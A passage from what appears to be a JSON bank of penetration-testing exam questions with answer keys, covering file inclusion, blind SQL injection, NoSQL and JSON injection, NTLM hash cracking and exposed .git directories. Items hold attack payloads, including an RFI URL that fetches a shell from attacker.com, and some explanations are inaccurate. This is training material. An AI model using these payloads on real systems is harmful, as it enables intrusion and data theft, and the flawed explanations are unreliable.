    "explanation": "The `internal;` directive within an Nginx `location` block is a crucial security feature. It makes the location *inaccessible* from external clients.  Only *internal* requests (e.g., those generated by `proxy_pass`, `sub_request`, or other Nginx modules) can access this location. This is often used to protect sensitive resources or internal APIs that should not be exposed directly to the internet. It doesn't create a publicly accessible directory, nor does it redirect requests.",
    "examTip": "The `internal;` directive in Nginx `location` blocks is a powerful way to restrict access to specific resources, allowing only internal requests and preventing direct access from external clients."
},
{
"id": 92,
"question": "You have obtained a low-privilege shell on a Linux server. You want to search for all files that have been modified in the last 24 hours to identify potentially recent changes related to a compromise. Which command is the MOST efficient and accurate for this purpose?",
"options": [
"a) `ls -l /`",
"b) `find / -mtime 0`",
"c) `find / -mtime -1`",
"d) `find / -type f -mmin -1440`"
],
"correctAnswerIndex": 3,
"explanation": "`ls -l /` only lists files in the root directory and doesn't filter by modification time. `-mtime 0` with find will print the files modified *exactly* today and before midnight, not last 24 hours. `-mtime -1` with find will show files *less than 1 day*, which could be slightly more than 24 hours. The MOST efficient is to find with `-type f -mmin -1440` .The `-type f` find all the files. The `-mmin -1440` finds files that have been modified within the last 1440 *minutes* (24 hours * 60 minutes/hour = 1440 minutes). This provides the most accurate results for the last 24 hours.",
"examTip": "Use `find / -type f -mmin -<minutes>` to locate files modified within the last `<minutes>` on a Linux system. This is a powerful tool for identifying recent changes during incident response or post-exploitation reconnaissance."
},
{
    "id": 93,
    "question": "You are performing a penetration test against a web application and discover a potential file inclusion vulnerability. The application is running on a Linux server, and you can control a parameter that is used in a PHP `include()` statement. You want to test for Remote File Inclusion (RFI). Which of the following payloads is MOST likely to succeed if RFI is enabled, and why?",
    "options": [
       "a) `http://attacker.com/shell.php`",
       "b) `file:///etc/passwd`",
       "c) `php://filter/read=convert.base64-encode/resource=index.php`",
       "d) `../../../../etc/passwd`"
    ],
    "correctAnswerIndex": 0,
    "explanation": "`file:///etc/passwd` tests for *Local* File Inclusion (LFI), not RFI. `php://filter...` is a powerful technique for LFI and *potentially* for achieving RCE *through* LFI, but it's not a direct RFI test.  `../../../../etc/passwd` is also for LFI (path traversal).  The most direct and reliable test for RFI is to attempt to include a file from a remote server using a URL: `http://attacker.com/shell.php`. If RFI is enabled, the PHP interpreter will fetch the remote file and execute it.",
    "examTip": "To test for Remote File Inclusion (RFI), try to include a file from a remote server using a URL (e.g., `http://attacker.com/shell.php`). If the server fetches and executes the remote file, RFI is present."
},
{
    "id": 94,
    "question":"You have obtained the password hash of a Windows user. The hash is in the following format: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:c9e9999a99a9999999999a99a9999999:::`. What type of hash is this, and which tool is BEST suited for cracking it?",
    "options":[
      "a) NTLM; John the Ripper.",
      "b) LM hash; Cain and Abel",
      "c) NTLM hash; Hashcat.",
      "d) Kerberos hash, Mimikatz."
    ],
    "correctAnswerIndex": 2,
    "explanation": "This is the standard format for an NTLM hash, commonly found in the SAM database or obtained through tools like Mimikatz. Specifically the  `aad3b435b51404eeaad3b435b51404ee` part is 'empty' or no password. The `c9e9999a99a9999999999a99a9999999` part is the actual NTLM hash. While John the Ripper *can* crack NTLM hashes, *Hashcat* is generally *significantly faster*, especially when using GPU acceleration. Cain and Abel is an older tool and less efficient for NTLM cracking than Hashcat. Mimikatz is for extracting credentials and performing attacks, not for *cracking* hashes.",
    "examTip": "Hashcat is generally the preferred tool for cracking NTLM hashes due to its speed and efficiency, especially when using GPU acceleration."
},
{
        "id": 95,
        "question": "You are performing a penetration test and have discovered a web application that is vulnerable to SQL injection. The application uses a backend database that supports time-based blind SQL injection techniques, and stacked queries are *not* supported. You want to determine the *length* of the database name. Which of the following payloads, combined with appropriate timing analysis, is the MOST efficient approach?",
        "options": [
            "a) `1' AND LENGTH(database()) = 1; --`",
            "b) `1' AND (SELECT SLEEP(5) FROM dual WHERE LENGTH(database())=1) AND '1'='1`",
            "c) `1' AND IF(LENGTH(database())=1,SLEEP(5),0)--`",
            "d) `1' AND IF(LENGTH(database())>1,SLEEP(5),0)--`"
        ],
        "correctAnswerIndex": 2,
        "explanation": "While (a) could work with modifications, it's not suitable for *blind* SQLi. (b) is overly verbose. (d) *could* work but it will be a very slow approach. Option c uses IF statement, which is perfect for blind SQLi. The most *efficient* approach for a *time-based blind* SQLi is to use the `IF()` function (or `CASE WHEN` in some databases) combined with `SLEEP()`.  The payload `1' AND IF(LENGTH(database())=1,SLEEP(5),0)--` checks if the length of the database name is 1. If it is, the `SLEEP(5)` function is executed, causing a 5-second delay. If it's not, there's no delay. You can then increment the number (1, 2, 3, etc.) until you observe the delay, revealing the length of the database name.",
        "examTip": "In time-based blind SQL injection, use the `IF()` function (or `CASE WHEN`) combined with `SLEEP()` to create conditional delays based on comparisons. This allows you to extract information (like lengths, characters) one step at a time."
    },
    {
        "id": 96,
        "question": "You are analyzing a compromised Windows system and find a suspicious executable. You want to quickly determine if this executable is packed or obfuscated *without* running it. Which of the following tools is BEST suited for this initial static analysis?",
        "options": [
            "a) OllyDbg",
            "b) PEiD",
            "c) Wireshark",
            "d) Regshot"
        ],
        "correctAnswerIndex": 1,
        "explanation": "OllyDbg is a *debugger*, used for dynamic analysis (running the code). Wireshark is a network protocol analyzer. Regshot is for comparing registry and file system snapshots. *PEiD (PE Identifier)* is a classic tool specifically designed for *static analysis* of Windows executables. It can identify common packers, crypters, and compilers used to create the executable, providing strong clues about whether the file is packed or obfuscated.",
        "examTip": "Use PEiD (or similar tools like Detect It Easy) for quick, static analysis of Windows executables to identify potential packing or obfuscation."
    },
    {
        "id": 97,
        "question": "You're performing a penetration test against a web application that uses a REST API. The API uses JSON for data exchange. You suspect a potential JSON injection vulnerability.  Which of the following payloads, injected into a JSON field, is MOST likely to reveal this vulnerability and potentially cause unexpected behavior in the application?",
        "options":[
          "a) `<script>alert(1)</script>`",
          "b) `1; DROP TABLE users; --`",
          "c) `\"test\":\"test\", \"newkey\":\"newvalue`",
          "d) `test`"
        ],
        "correctAnswerIndex": 2,
        "explanation": "Injecting JavaScript is relevant for XSS, not JSON injection. Injecting SQL is relevant for SQL injection, not JSON injection. Providing a simple string is unlikely to reveal a vulnerability. The correct payload is `\"test\":\"test\", \"newkey\":\"newvalue`. This payload attempts to *inject additional JSON key-value pairs* into the existing JSON structure.  If the application doesn't properly sanitize or validate the JSON input, this injection could alter the intended data structure, potentially leading to unexpected behavior, data corruption, or even security vulnerabilities, depending on how the application uses the JSON data.",
        "examTip": "When testing for JSON injection, try to inject additional key-value pairs, modify existing values, or introduce unexpected JSON structures to see if the application handles the input securely."

    },
    {
    "id": 98,
     "question": "You are performing a penetration test and have discovered a web server that allows directory listing. In one of the listed directories, you find a file named `.git`. What is the PRIMARY security implication of this finding, and what is your MOST important NEXT step?",
     "options":[
         "a) The web server is misconfigured, this is normal",
         "b) The application is using a shared hosting; report to the developer.",
         "c) The application's Git repository is exposed; Attempt to download the `.git` directory to access the source code, version history, and potentially sensitive information.",
         "d) The application is vulnerable to path traversal; attempt to read /etc/passwd"

     ],
     "correctAnswerIndex": 2,
     "explanation": "The presence of a `.git` directory in a web-accessible location is a *critical* security vulnerability. It means the application's *entire Git repository* is exposed.  The Git repository contains the complete source code history, including previous versions, commit messages, and potentially sensitive information like API keys, passwords, or configuration files that were mistakenly committed.  The most important next step is to attempt to *download the entire `.git` directory*.  Tools like `wget` or specialized Git repository downloaders can be used for this purpose. This allows for offline analysis of the source code and its history.",
     "examTip": "The presence of a `.git` directory in a web-accessible location is a major security risk. Immediately attempt to download the entire directory to access the source code and version history."
    },
    {
    "id": 99,
     "question": "You are analyzing a web application that uses HTTP Basic Authentication. You intercept a request and observe the following `Authorization` header: `Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==`. What is the significance of this header, and how can you obtain the credentials?",
     "options":[
       "a) The header contains a JWT token; decode using a JWT tool.",
       "b) The header contains the username and password, encoded using Base64; Decode it using a Base64 decoder.",
       "c)The header contains a Kerberos ticket; use mimikatz",
       "d) The header is encrypted; it needs to be decrypted."
     ],
      "correctAnswerIndex": 1,
      "explanation": "The `Authorization: Basic ...` header indicates HTTP Basic Authentication. The string following `Basic` is a *Base64-encoded* representation of the username and password, separated by a colon.  To obtain the credentials, you simply need to *decode the Base64 string*.  Any Base64 decoder (online tools, command-line tools like `base64`, or features within Burp Suite) can be used. In this case, `QWxhZGRpbjpvcGVuIHNlc2FtZQ==` decodes to `Aladdin:open sesame`.",
      "examTip": "HTTP Basic Authentication transmits credentials in Base64-encoded format.  Use a Base64 decoder to obtain the username and password from the `Authorization: Basic ...` header."
    },
    {
    "id": 100,
     "question": "You are performing a penetration test against a web application and have identified a potential NoSQL injection vulnerability in a MongoDB database. The application uses user input to construct a query to retrieve user profiles.  Which of the following payloads, injected into a username field, is MOST likely to bypass authentication and retrieve all user records if the application is vulnerable?",
    "options":[
      "a) `' OR 1=1--`",
      "b) `; db.users.find({});`",
      "c) `{$ne: null}`",
      "d) `admin`"
    ],
     "correctAnswerIndex": 2,
      "explanation": "Option (a) is a SQL injection. Option (b) is more related to command injection in a shell. Option (d) won't work unless we are looking for specific users. For MongoDB (a NoSQL database), the payload `{$ne: null}` is a classic NoSQL injection technique.  `$ne` means "not equal to".  This payload essentially says "find all documents where the username field is not equal to null". Since *every* document will have a username field that is not null (even if it's an empty string), this query will typically return *all* user records, bypassing authentication checks that rely on a specific username.",
      "examTip": "NoSQL injection differs significantly from SQL injection.  Learn common NoSQL injection payloads for MongoDB (e.g., `{$ne: null}`, `$gt: ""}`) and other NoSQL databases."

    }
  ]
}
